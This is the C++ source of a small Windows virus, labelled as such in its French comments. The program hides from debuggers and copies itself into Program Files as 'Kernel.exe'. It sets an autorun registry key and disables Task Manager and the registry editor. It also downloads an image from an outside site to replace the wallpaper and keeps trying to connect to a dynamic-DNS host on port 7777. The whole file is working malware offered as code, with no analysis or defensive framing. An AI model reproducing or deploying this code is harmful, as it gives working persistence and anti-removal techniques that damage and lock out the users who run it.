#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <urlmon.h>
#include <iostream>

typedef int socklen_t;


void reseau()
{
    /*Coin reseau*/
    SOCKET sock;
    SOCKADDR_IN sin;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in
    {
        short      sin_family;
        unsigned short   sin_port;
        struct   in_addr   sin_addr;
        char   sin_zero[8];
    };


    struct hostent *Host = gethostbyname("maxia.no-ip.biz");
    int i = 0;
    struct in_addr addr;

    if (Host->h_addrtype == AF_INET) // si IPv4
    {
        while (Host->h_addr_list[i] != 0)
        {
            addr.s_addr = *(u_long *) Host->h_addr_list[i++];
        }
    }
    sin.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(7777);

    while(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == -1)
    {
        Sleep(1000);
    }

    closesocket(sock);
    /*Coin reseau*/
}


int main(int argc, char* argv[])
{
    if(!IsDebuggerPresent())
    {

        HKEY clef;

        WSADATA WSAData;
        WSAStartup(MAKEWORD(2,2), &WSAData);

        if(RegOpenKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Maxia", &clef) == ERROR_SUCCESS) // si le virus est deja la
        {
            Sleep(120000);

            reseau();

            //bool continuer = true;

            /*while(continuer)
            {
                while(continuer)
                {
                    time_t temps;
                    struct tm *tempslocal;

                    time(&temps);
                    tempslocal = localtime(&temps);

                    int Jour = tempslocal -> tm_mday;
                    int Mois = tempslocal -> tm_mon;

                }
            }*/


        }
        else // si c'est la premiere execution du virus
        {

            LPCTSTR origine_fichier = argv[0];
            LPCTSTR destination_fichier = "C:\\Program Files\\Kernel.exe";

            if(CopyFile(origine_fichier, destination_fichier, FALSE))
            {
                HKEY key;


                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "Kernel", 0, REG_SZ, (BYTE*)"\"C:\\Program Files\\Kernel.exe\"", strlen("\"C:\\Program Files\\Kernel.exe\"") + 1);

                RegCloseKey(key);

                RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Maxia", &key);

                RegCloseKey(key);

                DWORD value = 1;

                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, (BYTE*) &value, sizeof(value));

                RegCloseKey(key);

                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, (BYTE*) &value, sizeof(value));

                RegCloseKey(key);


                URLDownloadToFile(NULL, "http://maxia.olympe.in/img/saw.jpg", "C:\\Program Files\\kernel.jpg", 0, NULL);
                if(URLDownloadToFile(NULL, "http://maxia.olympe.in/img/saw.jpg", "C:\\Windows\\x36.jpg", 0, NULL) == S_OK)
                {
                    RegOpenKeyEx(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_ALL_ACCESS, &key);
                    RegSetValueEx(key, "Wallpaper", 0, REG_SZ, (BYTE*)"\"C:\\Windows\\x36.jpg\"", strlen("\"C:\\Windows\\x36.jpg\""));
                    RegCloseKey(key);
                }

                reseau();
            }

            WSACleanup();

            return 0;
        }
    }
}
